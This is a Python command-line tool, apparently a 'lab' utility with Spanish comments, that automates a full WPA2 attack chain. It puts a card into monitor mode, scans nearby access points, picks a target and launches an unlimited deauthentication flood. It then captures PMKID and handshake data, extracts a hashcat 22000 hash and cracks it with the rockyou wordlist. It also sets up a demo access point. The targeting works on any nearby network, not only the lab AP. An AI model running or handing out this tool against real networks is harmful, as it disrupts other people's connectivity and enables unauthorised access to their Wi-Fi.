#!/usr/bin/env python3
"""
WPA2 Lab CLI – AirStrike Edition
© 2025
"""
from __future__ import annotations
import csv, logging, re, shutil, subprocess, sys, tempfile, time
from pathlib import Path
from typing import List, Optional, Tuple


import typer, yaml
from rich import box
from rich.console import Console, Group
from rich.panel import Panel
from rich.table import Table
from rich.align import Align      # ← AÑADE ESTA LÍNEA
# ---------------------------------------------------------------------------------
# 🔧 ─ Config & Logging
# ---------------------------------------------------------------------------------
SCRIPT_DIR  = Path(__file__).resolve().parent
PROJECTROOT = SCRIPT_DIR.parent
LOG_FILE    = PROJECTROOT / "logs/wpa2lab.log"
PCAP_FILE   = PROJECTROOT / "dump.pcapng"     # se actualiza en capture
HASH_FILE   = PROJECTROOT / "hash.22000"      # se actualiza en extract

# ── Estado global que iremos rellenando ───────────────────
STATE: dict = {
    "mon":   None,        # wlan0mon …
    "ap":    None,        # interfaz con hostapd
    "target": {},         # dict con bssid / channel / essid
    "hash":  None,        # ruta hash 22000
    "pw":    None         # password crackeada
}

# ── logging / consola ─────────────────────────────────────
logging.basicConfig(filename=LOG_FILE, level=logging.INFO,
                    format="%(asctime)s %(levelname)s %(message)s")
log      = logging.getLogger("wpa2lab")
console  = Console()
cli      = typer.Typer(add_completion=False)

# ---------------------------------------------------------------------------------
# ✨ ─ Ascii logo
# ---------------------------------------------------------------------------------
LOGO = """
██╗    ██╗ ██████╗   █████╗  ██████╗  ██╗       █████╗  ██████╗ 
██║    ██║ ██╔══██╗ ██╔══██╗ ╚════██║ ██║      ██╔══██╗ ██╔══██╗
██║ █╗ ██║ ██████╔╝ ███████║  █████╔╝ ██║      ███████║ ██████╔╝
██║███╗██║ ██╔═══╝  ██╔══██║ ██╔═══╝  ██║      ██╔══██║ ██╔══██╗
╚███╔███╔╝ ██║      ██║  ██║ ███████╗ ███████╗ ██║  ██║ ██████╔╝
 ╚══╝╚══╝  ╚═╝      ╚═╝  ╚═╝ ╚══════╝ ╚══════╝ ╚═╝  ╚═╝ ╚═════╝ 
"""


# ── helpers ──────────────────────────────────────────────
def run(cmd: list[str], *, sudo=False, quiet=False):
    full = ["sudo", *cmd] if sudo else cmd
    if not quiet:
        console.log(f"[cyan]$ {' '.join(full)}")
    log.info("CMD %s", " ".join(full))
    subprocess.run(full, check=True)

def ensure(tool: str, pkg: str|None=None):
    if shutil.which(tool): return
    console.print(f"[red]Falta {tool}[/]  → sudo apt install {pkg or tool}")
    raise typer.Exit()

def iw_ifaces() -> List[str]:
    txt = subprocess.check_output(["iw","dev"], text=True)
    return re.findall(r"Interface\s+(\w+)", txt)

def mon_iface() -> Optional[str]:
    return next((i for i in iw_ifaces() if i.endswith("mon")), None)

def ask_iface(title: str, allow_mon: bool=False) -> str:
    wl = iw_ifaces()
    if not allow_mon:
        wl = [i for i in wl if not i.endswith("mon")]
    tbl = Table(box=box.SIMPLE); tbl.add_column("idx"); tbl.add_column("iface")
    for i,iface in enumerate(wl): tbl.add_row(str(i), iface)
    console.print(tbl)
    idx = int(console.input(f"{title} nº >> ") or 0)
    return wl[idx]

def status_panel() -> Panel:
    mon = STATE["mon"] or "-"
    ap  = STATE["ap"]  or "-"
    tgt = STATE["target"]
    tgt_text = "-" if not tgt else f"{tgt.get('essid','')} ({tgt['bssid']} / ch {tgt['channel']})"
    hsh = STATE["hash"] or "-"
    pw  = STATE["pw"]   or "-"
    txt = (
        f"[bold]Monitor:[/] {mon}\n"
        f"[bold]Fake-AP:[/] {ap}\n"
        f"[bold]Objetivo:[/] {tgt_text}\n"
        f"[bold]Hash:[/] {hsh}\n"
        f"[bold]Pass:[/] {pw}"
    )
    return Panel(txt, title="Estado actual", box=box.ROUNDED, style="bright_blue")

# ── acciones (misma lógica que antes, pero actualizando STATE) ──────────────
def act_prepare():
    ensure("airmon-ng")
    iface = ask_iface("Interfaz a poner en MONITOR")
    run(["airmon-ng","check","kill"], sudo=True)
    run(["airmon-ng","start", iface], sudo=True)
    STATE["mon"] = iface+"mon"
    console.print(f"[green bold]✓[/] {STATE['mon']} activada")

def act_reset():
    ensure("airmon-ng")
    for m in [i for i in iw_ifaces() if i.endswith("mon")]:
        run(["airmon-ng","stop", m], sudo=True)
    STATE["mon"] = None
    console.print("[green bold]✓[/] Interfaces restauradas")

def act_ap():
    ensure("hostapd"); ensure("dnsmasq")
    iface = ask_iface("Interfaz para AP", allow_mon=False)
    STATE["ap"] = iface
    run(["ip","link","set",iface,"up"], sudo=True)
    run(["ip","addr","flush","dev",iface], sudo=True)
    run(["ip","addr","add","10.0.0.1/24","dev",iface], sudo=True)
    subprocess.run(["sudo","killall","hostapd"], check=False)
    subprocess.run(["sudo","killall","dnsmasq"], check=False)
    hapd = tempfile.NamedTemporaryFile("w", delete=False)
    hapd.write(f"interface={iface}\nssid=WPA2_LAB_FAKE\nchannel=6\nhw_mode=g\nwpa=2\n"
               "wpa_passphrase=Demo12345\nwpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP\n"); hapd.close()
    dns = tempfile.NamedTemporaryFile("w", delete=False)
    dns.write(f"interface={iface}\ndhcp-range=10.0.0.10,10.0.0.50,12h\n"); dns.close()
    run(["hostapd","-B",hapd.name], sudo=True, quiet=True)
    run(["dnsmasq","-C",dns.name],  sudo=True, quiet=True)
    console.print(f"[green bold]✓ AP activo en {iface}[/]")


def act_scan(duration=6):
    ensure("airodump-ng")
    if not STATE["mon"]:
        console.print("[red]Activa antes el modo monitor[/]")
        return

    tmp = tempfile.NamedTemporaryFile(suffix=".csv", delete=False)
    p = subprocess.Popen(
        ["sudo", "airodump-ng", "--write-interval", "1", "--output-format", "csv",
         "-w", tmp.name[:-4], STATE["mon"]],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    console.print(f"[cyan]Escaneando {duration}s…[/]")
    time.sleep(duration)
    p.terminate()

    csvf = Path(tmp.name[:-4] + "-01.csv")
    nets = []
    with csvf.open(errors="ignore") as fh:
        rdr = csv.reader(fh)
        started = False
        for r in rdr:
            if not r:
                continue
            if r[0].startswith("BSSID"):
                started = True
                continue
            if started and len(r) > 13 and re.match(r"([0-9A-F]{2}:){5}[0-9A-F]{2}", r[0]):
                nets.append((r[0].strip(), r[13].strip() or "<Hidden>", int(r[3]), r[5]))

    if not nets:
        console.print("[yellow]No se detectaron APs[/]")
        return

    inner = Table(
        show_header=True,
        box=None,
        pad_edge=True,
        collapse_padding=False,
    )

    inner.add_column("idx", justify="right", style="bold magenta", width=3, no_wrap=True)
    inner.add_column("BSSID", style="cyan", width=17, no_wrap=True)
    inner.add_column("ESSID", style="white", width=22, no_wrap=True)
    inner.add_column("CH", justify="center", width=3, no_wrap=True)
    inner.add_column("ENC", justify="center", width=6, no_wrap=True)

    for i, (b, e, ch, enc) in enumerate(nets):
        inner.add_row(str(i), b, e, str(ch), enc)

    panel = Panel(
        inner,
        title="APs detectados",
        title_align="center",
        box=box.SQUARE,
        padding=(0, 1)
    )

    console.print(panel)

    try:
        idx = int(console.input("Target nº >> ") or 0)
        b, e, ch, _ = nets[idx]
        STATE["target"] = {"bssid": b, "essid": e, "channel": ch}
        console.print(f"[green]✓ Objetivo seleccionado:[/] {b}")
    except (IndexError, ValueError):
        console.print("[red]Índice no válido.[/]")


def act_deauth():
    ensure("aireplay-ng","aircrack-ng")
    if not (STATE["mon"] and STATE["target"]):
        console.print("[red]Falta monitor o target[/]"); return
    run(["aireplay-ng","--deauth","0",
         "-a",STATE["target"]["bssid"], STATE["mon"]], sudo=True)

def act_deauth():
    ensure("aireplay-ng","aircrack-ng")
    tgt = STATE["target"]; mon = STATE["mon"]
    if not (tgt and mon): console.print("[red]Falta monitor o target[/]"); return
    run(["aireplay-ng","--deauth","0","-a",tgt["bssid"],mon], sudo=True)

def act_capture():
    ensure("hcxdumptool")
    mon = STATE["mon"]
    if not mon: console.print("[red]No hay monitor[/]"); return
    if STATE["target"]:
        bssid, ch = STATE["target"]["bssid"], str(STATE["target"]["channel"])
    else:
        bssid = console.input("BSSID >> ").strip().upper()
        ch = console.input("Canal >> ").strip()
    console.print(f"[cyan]Capturando PMKID… Ctrl-C para parar[/]")
    try:
        run(["hcxdumptool","-i",mon,"-c",ch,"-t",bssid,"-o",str(PCAP_FILE)],
            sudo=True, quiet=True)
    except KeyboardInterrupt:
        pass
    STATE["hash"] = str(PCAP_FILE)
    console.print(f"[green bold]✓[/] PCAP guardado → {PCAP_FILE}")

def act_extract():
    ensure("hcxpcapngtool","hcxtools")
    run(["hcxpcapngtool","-o",str(HASH_FILE), str(PCAP_FILE)], quiet=True)
    STATE["hash"] = str(HASH_FILE)
    console.print(f"[green bold]✓ Hash 22000 → {HASH_FILE}")

def act_crack():
    ensure("hashcat")
    rock = "/usr/share/wordlists/rockyou.txt"
    run(["hashcat","-m","22000",str(HASH_FILE), rock], quiet=True)
    out = subprocess.check_output(["hashcat","-m","22000","--show",str(HASH_FILE)], text=True)
    if out.strip():
        pw = out.split(":",1)[1].strip()
        STATE["pw"] = pw
        console.print(f"[green bold]✓ Contraseña encontrada:[/] {pw}")
    else:
        console.print("[yellow]No crackeada (usa otra WL)[/]")

# ── menú ─────────────────────────────────────────────────
MENU = [
    ("1","Modo MONITOR",   act_prepare),
    ("2","Levantar AP",    act_ap),
    ("3","Reset IFs",      act_reset),
    ("4","Escanear redes", act_scan),
    ("5","Deauth attack",  act_deauth),
    ("6","Capturar PMKID", act_capture),
    ("7","Extraer hash",   act_extract),
    ("8","Crack offline",  act_crack),
    ("0","Salir",          None),
]

def show_menu():
    console.clear()
    console.print(Panel(Align.center(LOGO), box=box.DOUBLE, style="cyan"))
    console.print(status_panel())
    tbl = Table(box=box.ROUNDED, show_header=False, padding=(0,1))
    tbl.add_column(" Nº ", justify="right", style="magenta bold")
    tbl.add_column("Acción", style="bold white")
    for k,txt,_ in MENU: tbl.add_row(k, txt)
    console.print(tbl)

def interactive():
    actions = {k:f for k,_,f in MENU}
    while True:
        show_menu()
        try:
            choice = console.input("[bold cyan]>> [/]").strip()
        except KeyboardInterrupt:
            continue
        if choice=="0":
            console.print("[bold yellow]Bye![/]"); break
        fn = actions.get(choice)
        if not fn:
            console.print("[red]Opción inválida[/]"); time.sleep(1); continue
        try:
            fn()
        except KeyboardInterrupt:
            console.print("[yellow]· Cancelado ·[/]")
        except Exception as e:
            console.print(f"[red]Error:[/] {e}")
        console.input("[green]Intro para menú…[/]")


# ── CLI directo (Typer) ────────────────────────────────────────────────────
@cli.command()  # python … monitor
def monitor(): act_prepare()
@cli.command()  # python … ap
def ap():       act_ap()
@cli.command()  # python … scan-cli
def scan_cli(): act_scan()
@cli.command()  # python … deauth
def deauth():   act_deauth()
@cli.command()  # python … capture
def capture():  act_capture()
@cli.command()  # python … extract
def extract():  act_extract()
@cli.command()  # python … crack
def crack():    act_crack()

if __name__ == "__main__":
    if len(sys.argv) > 1:
        cli()          # modo “python script.py comando …”
    else:
        interactive()  # menú gráfico
